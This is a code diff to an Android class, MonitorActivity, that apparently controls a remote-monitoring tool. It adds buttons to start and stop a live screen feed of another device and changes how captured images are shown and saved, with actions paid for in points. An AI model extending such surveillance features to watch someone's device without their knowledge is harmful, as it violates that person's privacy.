@@ -203,12 +203,6 @@ class MonitorActivity : AppCompatActivity() {
             }
         }
 
-        findViewById<Button>(R.id.btnSaveImage).setOnClickListener {
-            checkAndDeductPoints(50, "Save Image") {
-                saveLatestImageToDownloads()
-            }
-        }
-
         findViewById<Button>(R.id.btnSaveScreen)?.setOnClickListener {
             checkAndDeductPoints(50, "Save Screen") {
                 saveLatestScreenTextToDownloads()
@@ -227,6 +221,17 @@ class MonitorActivity : AppCompatActivity() {
                 sendCommand("READ_SCREEN")
                 tabLayout.getTabAt(2)?.select() // Jump to Screen Tab
             }
+        }
+
+        findViewById<Button>(R.id.btnStartLiveScreen).setOnClickListener {
+            checkAndDeductPoints(200, "Start Live Screen") {
+                sendCommand("START_LIVE_SCREEN")
+                tabLayout.getTabAt(2)?.select() // Jump to Screen Tab
+            }
+        }
+
+        findViewById<Button>(R.id.btnStopLiveScreen).setOnClickListener {
+            sendCommand("STOP_LIVE_SCREEN")
         }
 
         findViewById<Button>(R.id.btnStartRecord).setOnClickListener {
@@ -620,31 +625,33 @@ class MonitorActivity : AppCompatActivity() {
                 tv.text = "Image received."
                 container.addView(tv)
                 lastImageUrl = data // Using this for base64 now
-                findViewById<Button>(R.id.btnSaveImage).visibility = View.VISIBLE
+
+                val btnSaveImage = Button(this).apply {
+                    text = "Save Image (50 pts)"
+                    setOnClickListener {
+                        checkAndDeductPoints(50, "Save Image") {
+                            saveLatestImageToDownloads()
+                        }
+                    }
+                }
+                container.addView(btnSaveImage)
 
                 try {
                     val imageBytes = Base64.decode(data, Base64.NO_WRAP)
                     val bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.size)
                     if (bitmap != null) {
-                        val imageView = findViewById<ImageView>(R.id.ivFetchedImage)
-                        val targetImageView = if (imageView != null) {
-                            imageView.setImageBitmap(bitmap)
-                            imageView.visibility = View.VISIBLE
-                            imageView
-                        } else {
-                            val newImageView = ImageView(this@MonitorActivity).apply {
-                                setImageBitmap(bitmap)
-                                adjustViewBounds = true
-                                layoutParams = LinearLayout.LayoutParams(
-                                    LinearLayout.LayoutParams.MATCH_PARENT,
-                                    LinearLayout.LayoutParams.WRAP_CONTENT
-                                ).apply {
-                                    setMargins(0, 16, 0, 16)
-                                }
+                        val newImageView = ImageView(this@MonitorActivity).apply {
+                            setImageBitmap(bitmap)
+                            adjustViewBounds = true
+                            layoutParams = LinearLayout.LayoutParams(
+                                LinearLayout.LayoutParams.MATCH_PARENT,
+                                LinearLayout.LayoutParams.WRAP_CONTENT
+                            ).apply {
+                                setMargins(0, 16, 0, 16)
                             }
-                            container.addView(newImageView)
-                            newImageView
                         }
+                        container.addView(newImageView)
+                        val targetImageView = newImageView
 
                         targetImageView.setOnClickListener {
                             val dialog = Dialog(this@MonitorActivity)
